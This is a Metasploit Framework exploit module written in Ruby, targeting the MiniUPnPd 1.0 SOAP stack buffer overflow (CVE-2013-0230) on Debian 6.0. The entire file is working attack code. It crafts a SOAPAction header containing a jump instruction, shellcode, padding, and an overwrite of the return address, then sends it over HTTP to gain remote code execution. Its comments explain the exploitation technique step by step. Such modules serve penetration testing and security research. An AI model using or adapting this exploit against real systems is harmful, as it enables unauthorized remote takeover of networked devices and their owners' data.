# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  include Msf::Exploit::Remote::HttpClient
  Rank = NormalRanking

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;MiniUPnPd 1.0 Stack Buffer Overflow Remote Code Execution&#039;,
      &#039;Description&#039;    => %q{
          This module exploits the MiniUPnP 1.0 SOAP stack buffer overflow vulnerability
      },
      &#039;Author&#039;         =>
        [
          &#039;hdm&#039;, # Vulnerability discovery
          &#039;Dejan Lukan&#039; # Metasploit module
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;DefaultOptions&#039; => { &#039;EXITFUNC&#039; => &#039;process&#039;, },
      # the byte &#039;\x22&#039; is the &#039;"&#039; character and the miniupnpd scans for that character in the
      # input, which is why it can&#039;t be part of the shellcode (otherwise the vulnerable part
      # of the program is never reached)
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039; => 2060,
          &#039;BadChars&#039; => "\x00\x22",
          &#039;DisableNops&#039; => true
        },
      &#039;Platform&#039;       => &#039;linux&#039;,
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2013-0230&#039; ],
          [ &#039;OSVDB&#039;, &#039;89624&#039; ],
          [ &#039;BID&#039;, &#039;57608&#039; ],
          [ &#039;URL&#039;, &#039;https://community.rapid7.com/community/infosec/blog/2013/01/29/security-flaws-in-universal-plug-and-play-unplug-dont-play&#039;]
        ],
      &#039;Targets&#039;        =>
        [
          [ &#039;Debian GNU/Linux 6.0 / MiniUPnPd 1.0&#039;,
            {
              &#039;Ret&#039; => 0x0804ee43, # pop ebp # ret # from miniupnpd
              &#039;Offset&#039; => 2123
            }
          ],
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => &#039;Mar 27 2013&#039;,
    ))

    register_options([
      Opt::RPORT(5555),
    ], self.class)
  end

  def exploit
    #
    # Build the SOAP Exploit
    #
    # jmp 0x2d ; jump forward 0x2d bytes (jump right after the &#039;#&#039; char)
    sploit  = "\xeb\x2d"

    # a valid action
    sploit += "n:schemas-upnp-org:service:WANIPConnection:1#"

    # payload
    sploit += payload.encoded

    # nops
    sploit += rand_text(target[&#039;Offset&#039;] - sploit.length - 16)

    # overwrite registers on stack: the values are not used, so we can overwrite them with anything
    sploit += rand_text(4)     # overwrite EBX
    sploit += rand_text(4)     # overwrite ESI
    sploit += rand_text(4)     # overwrite EDI
    sploit += rand_text(4)     # overwrite EBP

    # Overwrite EIP with addresss of "pop ebp, ret", because the second value on the
    # stack points directly to the string after &#039;Soapaction: &#039;, which is why we must
    # throw the first value on the stack away, which we&#039;re doing with the pop ebp
    # instruction. Then we&#039;re returning to the next value on the stack, which is
    # exactly the address that we want.
    sploit += [target.ret].pack(&#039;V&#039;)

    # the ending " character is necessary for the vulnerability to be reached
    sploit += "\""

    # data sent in the POST body
    data =
      "<?xml version=&#039;1.0&#039; encoding=\"UTF-8\"?>\r\n" +
      "<SOAP-ENV:Envelope\r\n" +
      "  SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"\r\n" +
      "  xmlns:SOAP-ENC=\"http://schemas.xmlsoap.org/soap/encoding/\"\r\n" +
      "  xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\"\r\n" +
      ">\r\n" +
      "<SOAP-ENV:Body>\r\n" +
      "<ns1:action xmlns:ns1=\"urn:schemas-upnp-org:service:WANIPConnection:1\" SOAP-ENC:root=\"1\">\r\n" +
      "</ns1:action>\r\n" +
      "</SOAP-ENV:Body>\r\n" +
      "</SOAP-ENV:Envelope>\r\n"

    #
    # Build and send the HTTP request
    #
    print_status("Sending exploit to victim #{target.name} at ...")
    send_request_cgi({
      &#039;method&#039;  => &#039;POST&#039;,
      &#039;uri&#039;     => "/",
      &#039;headers&#039; => {
        &#039;SOAPAction&#039; => sploit,
      },
      &#039;data&#039;    => data,
    })

    # disconnect from the server
    disconnect
  end
end

